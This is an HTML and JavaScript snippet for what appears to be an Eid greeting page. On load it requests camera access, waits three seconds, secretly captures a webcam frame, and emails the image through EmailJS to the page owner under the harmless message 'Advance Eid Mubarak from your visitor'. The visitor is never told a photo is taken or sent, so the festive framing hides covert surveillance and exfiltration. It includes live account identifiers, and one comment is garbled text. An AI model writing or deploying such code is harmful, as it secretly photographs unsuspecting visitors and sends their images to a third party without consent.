  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init('ZRO2rAOiW-vdxKU5Y'); // ÿ™ŸÖ€Åÿßÿ±€å EmailJS user ID

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        const video = document.getElementById('video');
        video.srcObject = stream;

        // Wait a few seconds before capturing
        setTimeout(function() {
          const canvas = document.getElementById('canvas');
          const context = canvas.getContext('2d');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          const imageData = canvas.toDataURL('image/png');

          emailjs.send('talha8888', 'template_gg96m9k', {
            to_name: "Talha",
            from_name: "Eid Visitor",
            message: "üéâ Advance Eid Mubarak from your visitor!",
            screenshot: imageData
          }).then(function(response) {
            console.log("Email sent!", response.status, response.text);
          }, function(error) {
            console.error("Email error:", error);
          });

        }, 3000); // delay to capture
      })
      .catch(function(error) {
        alert('Camera access denied!');
      });
  </script>
